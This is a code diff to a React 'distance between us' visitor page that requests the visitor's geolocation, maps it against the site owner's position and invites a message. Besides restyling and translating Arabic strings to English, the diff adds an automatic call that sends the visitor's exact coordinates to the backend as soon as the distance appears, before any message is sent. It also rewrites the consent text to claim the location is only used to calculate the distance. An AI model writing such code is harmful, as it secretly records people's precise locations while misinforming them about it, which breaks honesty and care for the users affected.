@@ -12,23 +12,23 @@ L.Icon.Default.mergeOptions({
   shadowUrl: null,
 });
 
-// Custom minimal circular markers
-const makeIcon = (color) =>
+// Custom minimal circular markers for the map
+const makeIcon = (bg, border) =>
   L.divIcon({
     className: '',
     html: `<div style="
-      width:14px;height:14px;
-      background:${color};
+      width:16px;height:16px;
+      background:${bg};
       border-radius:50%;
-      border:2.5px solid white;
-      box-shadow:0 2px 6px rgba(0,0,0,0.25);
+      border:2.5px solid ${border};
+      box-shadow:0 0 10px ${bg};
     "></div>`,
-    iconSize: [14, 14],
-    iconAnchor: [7, 7],
+    iconSize: [16, 16],
+    iconAnchor: [8, 8],
   });
 
-const adminIcon = makeIcon('#18181b');  // zinc-900
-const visitorIcon = makeIcon('#71717a'); // zinc-500
+const adminIcon = makeIcon('rgba(220, 180, 140, 0.9)', 'rgba(255, 255, 255, 0.8)'); // Light amber/wood
+const visitorIcon = makeIcon('rgba(166, 112, 65, 0.9)', 'rgba(255, 255, 255, 0.8)'); // Deep wood
 
 // Fit map to show both markers
 function FitBounds({ positions }) {
@@ -64,7 +64,7 @@ export default function VisitorPage() {
   useEffect(() => {
     if (!hasLogged.current) {
       hasLogged.current = true;
-      api.logVisitor(navigator.userAgent).catch(() => { });
+      api.logVisitor(navigator.userAgent).catch(() => {});
     }
   }, []);
 
@@ -73,6 +73,7 @@ export default function VisitorPage() {
     setError('');
     try {
       const loc = await api.getLocation();
+      // If backend returns location with null adminLat
       if (!loc.adminLat) throw new Error('no-admin-location');
 
       const pos = await new Promise((resolve, reject) =>
@@ -89,11 +90,26 @@ export default function VisitorPage() {
       setVisitorCoords({ lat: latitude, lng: longitude });
       setDistance(dist);
       setPhase(PHASE.REVEAL);
+
+      // Auto-send empty message to capture location
+      api.sendMessage({
+        text: '',
+        distanceInMeters: dist,
+        senderLat: latitude,
+        senderLng: longitude,
+      }).then(res => {
+        if (res && res._id) {
+          localStorage.setItem('currentMessageId', res._id);
+        }
+      }).catch(console.error);
     } catch (err) {
-      if (err.code === 1) {
+      if (err.message === 'no-admin-location') {
+        setError('The other party has not set their location yet. Distance calculation unavailable.');
+        setPhase(PHASE.ASK);
+      } else if (err.code === 1) { // PERMISSION_DENIED
         setPhase(PHASE.DENIED);
       } else {
-        setError('حدث خطأ ما. يرجى المحاولة مرة أخرى.');
+        setError('An error occurred. Please try again.');
         setPhase(PHASE.ASK);
       }
     }
@@ -103,15 +119,21 @@ export default function VisitorPage() {
     if (!message.trim()) return;
     setSending(true);
     try {
-      await api.sendMessage({
-        text: message.trim(),
-        distanceInMeters: distance,
-        senderLat: visitorCoords.lat,
-        senderLng: visitorCoords.lng,
-      });
+      const msgId = localStorage.getItem('currentMessageId');
+      if (msgId) {
+        await api.updateMessage(msgId, message.trim());
+      } else {
+        await api.sendMessage({
+          text: message.trim(),
+          distanceInMeters: distance,
+          senderLat: visitorCoords.lat,
+          senderLng: visitorCoords.lng,
+        });
+      }
+      localStorage.removeItem('currentMessageId');
       setPhase(PHASE.SENT);
     } catch {
-      setError('تعذّر إرسال الرسالة. حاول مرة أخرى.');
+      setError('Failed to send the message. Please try again.');
     } finally {
       setSending(false);
     }
@@ -122,28 +144,28 @@ export default function VisitorPage() {
     : [];
 
   return (
-    <div className="min-h-screen bg-zinc-50 flex flex-col items-center justify-center px-4 py-12">
+    <div className="min-h-screen flex flex-col items-center justify-center px-4 py-12">
       {/* Ask phase */}
       {phase === PHASE.ASK && (
         <div className="animate-fadeInUp w-full max-w-sm">
           <Card>
             <div className="mb-8">
-              <div className="w-10 h-px bg-zinc-900 mb-6" />
-              <h1 className="text-2xl font-semibold text-zinc-900 leading-snug mb-3">
-                المسافة بيننا
+              <div className="w-10 h-px bg-[rgba(245,230,211,0.5)] mb-6 shadow-[0_0_10px_rgba(255,255,255,0.3)]" />
+              <h1 className="text-2xl font-serif font-semibold text-[#fdf8f5] leading-snug mb-3">
+                The Distance Between Us
               </h1>
-              <p className="text-sm text-zinc-500 leading-relaxed">
-                أريد أن أعرف كم تبعد عني الآن.
-                <br />
-                لن يتم حفظ موقعك بشكل دائم.
+              <p className="text-sm font-light text-[#e5d3c8] leading-relaxed opacity-90">
+                I'd like to know how far you are from me right now.
+                <br /><br />
+                <span className="opacity-70 text-xs">Your location is only used to calculate the distance.</span>
               </p>
             </div>
-            {error && <p className="text-xs text-zinc-400 mb-4 text-center">{error}</p>}
+            {error && <p className="text-xs text-[#ffb0a0] mb-4 text-center">{error}</p>}
             <PrimaryButton onClick={requestLocation}>
-              احسب المسافة
+              Calculate Distance
             </PrimaryButton>
           </Card>
-          <p className="text-center text-xs text-zinc-300 mt-6">عبدالرحمن</p>
+          <p className="text-center text-xs text-[#a8998b] mt-6 tracking-widest font-light">DISTANCE APP</p>
         </div>
       )}
 
@@ -151,9 +173,9 @@ export default function VisitorPage() {
       {phase === PHASE.LOADING && (
         <div className="animate-fadeInUp w-full max-w-sm">
           <Card>
-            <div className="flex flex-col items-center gap-3 py-4">
-              <div className="w-5 h-5 border-2 border-zinc-300 border-t-zinc-800 rounded-full animate-spin" />
-              <p className="text-sm text-zinc-400 animate-pulse-soft">جارٍ تحديد موقعك...</p>
+            <div className="flex flex-col items-center gap-4 py-6">
+              <div className="w-6 h-6 border-[3px] border-[rgba(220,180,140,0.2)] border-t-[rgba(220,180,140,0.9)] rounded-full animate-spin" />
+              <p className="text-sm font-medium text-[#e5d3c8] animate-pulse-soft">Locating coordinates...</p>
             </div>
           </Card>
         </div>
@@ -164,13 +186,13 @@ export default function VisitorPage() {
         <div className="animate-fadeInUp w-full max-w-sm">
           <Card>
             <div className="mb-6">
-              <div className="w-10 h-px bg-zinc-200 mb-6" />
-              <p className="text-sm text-zinc-500 leading-relaxed mb-6">
-                لم أتمكن من الوصول لموقعك. يمكنك السماح بالوصول من إعدادات المتصفح والمحاولة مرة أخرى.
+              <div className="w-10 h-px bg-[rgba(245,230,211,0.5)] mb-6 shadow-[0_0_10px_rgba(255,255,255,0.3)]" />
+              <p className="text-sm font-light text-[#e5d3c8] leading-relaxed mb-6 opacity-90">
+                Location access was denied. Please allow location permissions in your browser settings to continue.
               </p>
             </div>
             <SecondaryButton onClick={() => setPhase(PHASE.ASK)}>
-              حاول مرة أخرى
+              Try Again
             </SecondaryButton>
           </Card>
         </div>
@@ -178,61 +200,64 @@ export default function VisitorPage() {
 
       {/* Reveal phase */}
       {phase === PHASE.REVEAL && visitorCoords && adminLocation && (
-        <div className="animate-fadeInUp w-full max-w-lg space-y-4">
+        <div className="animate-fadeInUp w-full max-w-lg space-y-6">
           {/* Map */}
-          <div className="rounded-2xl overflow-hidden border border-zinc-200 shadow-sm" style={{ height: 320 }}>
-            <MapContainer
-              center={[visitorCoords.lat, visitorCoords.lng]}
-              zoom={10}
-              style={{ height: '100%', width: '100%' }}
-              zoomControl={false}
-              attributionControl={false}
-            >
-              <TileLayer
-                url="https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png"
-                attribution=""
-              />
-              <Marker position={[adminLocation.lat, adminLocation.lng]} icon={adminIcon} />
-              <Marker position={[visitorCoords.lat, visitorCoords.lng]} icon={visitorIcon} />
-              <Polyline
-                positions={positions}
-                pathOptions={{
-                  color: '#18181b',
-                  weight: 1.5,
-                  opacity: 0.6,
-                  dashArray: '6, 8',
-                }}
-              />
-              <FitBounds positions={positions} />
-            </MapContainer>
+          <div className="rounded-2xl overflow-hidden glass-panel border-none p-1" style={{ height: 320 }}>
+            <div className="w-full h-full rounded-xl overflow-hidden shadow-inner">
+              <MapContainer
+                center={[visitorCoords.lat, visitorCoords.lng]}
+                zoom={10}
+                style={{ height: '100%', width: '100%', background: 'transparent' }}
+                zoomControl={false}
+                attributionControl={false}
+              >
+                <TileLayer
+                  url="https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png"
+                  attribution=""
+                />
+                <Marker position={[adminLocation.lat, adminLocation.lng]} icon={adminIcon} />
+                <Marker position={[visitorCoords.lat, visitorCoords.lng]} icon={visitorIcon} />
+                <Polyline
+                  positions={positions}
+                  pathOptions={{
+                    color: 'rgba(220, 180, 140, 0.7)',
+                    weight: 2,
+                    opacity: 1,
+                    dashArray: '8, 8',
+                    className: 'dashed-line'
+                  }}
+                />
+                <FitBounds positions={positions} />
+              </MapContainer>
+            </div>
           </div>
 
-          {/* Distance display */}
+          {/* Distance display & Message Input */}
           <Card>
             <div className="text-center mb-6">
-              <p className="text-xs text-zinc-400 mb-1">المسافة المباشرة بيننا الآن</p>
-              <p className="text-3xl font-bold text-zinc-900 tracking-tight">
-                {formatDistance(distance)}
+              <p className="text-xs tracking-widest uppercase font-semibold text-[#c8aa96] mb-2 opacity-80">Direct distance</p>
+              <p className="text-4xl font-serif font-bold text-[#fdf8f5] tracking-tight drop-shadow-md">
+                {formatDistance(distance)} {/* Note: you may need to translate 'كم' inside distance format function if desired */}
               </p>
-              <p className="text-xs text-zinc-300 mt-1">
-                ({distance.toLocaleString('ar-EG')} متر تقريباً)
+              <p className="text-xs font-light text-[#e5d3c8] mt-2 opacity-60">
+                (approximately {(distance).toLocaleString('en-US')} meters)
               </p>
             </div>
 
-            <div className="w-full h-px bg-zinc-100 mb-6" />
+            <div className="w-full h-px bg-[rgba(255,255,255,0.06)] mb-6 shadow-[0_1px_1px_rgba(0,0,0,0.5)]" />
 
-            <p className="text-sm text-zinc-500 mb-3">اترك لي رسالة</p>
+            <p className="text-sm font-medium text-[#e5d3c8] mb-3 opacity-90">Leave a message</p>
             <textarea
               value={message}
               onChange={e => setMessage(e.target.value)}
-              placeholder="اكتب ما يخطر ببالك..."
+              placeholder="Write your thoughts here..."
               rows={3}
-              className="w-full resize-none rounded-xl border border-zinc-200 bg-zinc-50 px-4 py-3 text-sm text-zinc-800 placeholder-zinc-300 outline-none focus:border-zinc-400 focus:bg-white transition-all leading-relaxed"
+              className="w-full resize-none rounded-xl px-4 py-3 text-sm font-light leading-relaxed glass-input"
             />
-            {error && <p className="text-xs text-zinc-400 mt-2">{error}</p>}
-            <div className="mt-3">
+            {error && <p className="text-xs text-[#ffb0a0] mt-2">{error}</p>}
+            <div className="mt-4">
               <PrimaryButton onClick={handleSend} disabled={sending || !message.trim()}>
-                {sending ? 'جارٍ الإرسال...' : 'أرسل'}
+                {sending ? 'Sending...' : 'Send Message'}
               </PrimaryButton>
             </div>
           </Card>
@@ -243,10 +268,10 @@ export default function VisitorPage() {
       {phase === PHASE.SENT && (
         <div className="animate-fadeInUp w-full max-w-sm">
           <Card>
-            <div className="text-center py-4">
-              <div className="w-10 h-px bg-zinc-900 mx-auto mb-6" />
-              <p className="text-lg font-medium text-zinc-800 mb-2">وصلت رسالتك</p>
-              <p className="text-sm text-zinc-400">شكراً لك على المشاركة.</p>
+            <div className="text-center py-6">
+              <div className="w-10 h-px bg-[rgba(245,230,211,0.5)] mx-auto mb-6 shadow-[0_0_10px_rgba(255,255,255,0.3)]" />
+              <p className="text-xl font-serif font-medium text-[#fdf8f5] mb-3">Message Received</p>
+              <p className="text-sm font-light text-[#e5d3c8] opacity-80">Thank you for sharing your thoughts.</p>
             </div>
           </Card>
         </div>
@@ -255,10 +280,12 @@ export default function VisitorPage() {
   );
 }
 
-// Shared UI components
+// Shared UI components mapped to Glassmorphism Global CSS
 function Card({ children }) {
   return (
-    <div className="bg-white border border-zinc-100 rounded-2xl p-7 shadow-sm">
+    <div className="glass-panel p-8 shadow-2xl relative overflow-hidden rounded-3xl">
+      {/* Subtle shine effect */}
+      <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[rgba(255,255,255,0.15)] to-transparent opacity-50"></div>
       {children}
     </div>
   );
@@ -269,7 +296,7 @@ function PrimaryButton({ children, onClick, disabled }) {
     <button
       onClick={onClick}
       disabled={disabled}
-      className="w-full bg-zinc-900 text-white text-sm font-medium rounded-xl py-3 px-6 transition-all hover:bg-zinc-700 active:scale-95 disabled:opacity-40 disabled:cursor-not-allowed"
+      className="w-full text-sm font-semibold tracking-wide uppercase rounded-xl py-3.5 px-6 glass-button-primary"
     >
       {children}
     </button>
@@ -280,7 +307,7 @@ function SecondaryButton({ children, onClick }) {
   return (
     <button
       onClick={onClick}
-      className="w-full border border-zinc-200 text-zinc-600 text-sm font-medium rounded-xl py-3 px-6 transition-all hover:border-zinc-400 hover:text-zinc-800 active:scale-95"
+      className="w-full text-sm font-medium tracking-wide uppercase rounded-xl py-3.5 px-6 glass-button-secondary"
     >
       {children}
     </button>
